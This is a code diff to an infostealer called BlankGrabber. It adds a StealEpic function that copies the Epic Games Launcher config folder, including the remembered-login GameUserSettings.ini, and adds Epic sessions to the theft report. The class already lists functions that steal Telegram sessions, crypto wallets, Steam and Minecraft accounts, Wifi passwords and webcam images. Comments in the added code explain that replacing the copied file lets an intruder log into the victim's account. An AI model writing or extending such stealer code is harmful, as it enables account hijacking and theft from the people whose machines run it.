@@ -783,6 +783,7 @@ class BlankGrabber:
     TelegramSessions: int = 0 # Number of Telegram sessions collected
     WalletsCount: int = 0 # Number of different crypto wallets collected
     SteamCount: int = 0 # Number of steam accounts collected
+    EpicCount: int = 0 # Number of epic accounts collected
 
     def __init__(self) -> None: # Constructor to call all the functions
         self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n" # Sets the value of the separator
@@ -804,6 +805,7 @@ class BlankGrabber:
             (self.StealTelegramSessions, False),
             (self.StealWallets, False),
             (self.StealMinecraft, False),
+            (self.StealEpic, False),
             (self.StealSteam, False),
             (self.GetAntivirus, False),
             (self.GetClipboard, False),
@@ -859,6 +861,24 @@ class BlankGrabber:
                     os.makedirs(os.path.join(saveToPath, name), exist_ok= True)
                     shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                     self.MinecraftSessions += 1
+                    
+    @Errors.Catch
+    def StealEpic(self) -> None: #Steals Epic accounts
+        if Settings.CaptureGames:
+            saveToPath = os.path.join(self.TempFolder, "Games", "Epic")
+            epicPath = os.path.join(os.getenv("localappdata"), "EpicGamesLauncher", "Saved", "Config", "Windows")
+            if os.path.isdir(epicPath):
+                loginFile = os.path.join(epicPath, "GameUserSettings.ini") #replace this file to login to epic client
+                if os.path.isfile(loginFile):
+                    with open(loginFile) as file:
+                        contents = file.read()
+                    if "[RememberMe]" in contents:
+                        os.makedirs(saveToPath, exist_ok= True)
+                        shutil.copytree(epicPath, saveToPath, dirs_exist_ok= True)
+                        self.EpicCount += 1
+    # The section above pulls the entire directory of files which is where the one required file is located.
+    # The only file needed to be replaced in order to login is "GameUserSettings.ini".
+    # In the future, the other files may be needed to login if Epic updates client security.
     
     @Errors.Catch
     def StealSteam(self) -> None: # Steals Steam accounts
@@ -1348,6 +1368,7 @@ class BlankGrabber:
                             "Wallets" : self.WalletsCount,
                             "Wifi Passwords" : len(self.WifiPasswords),
                             "Minecraft Sessions" : self.MinecraftSessions,
+                            "Epic Sessions" : self.EpicCount,
                             "Steam Sessions" : self.SteamCount,
                             "Screenshot" : self.Screenshot,
                             "Webcam" : self.WebcamPictures
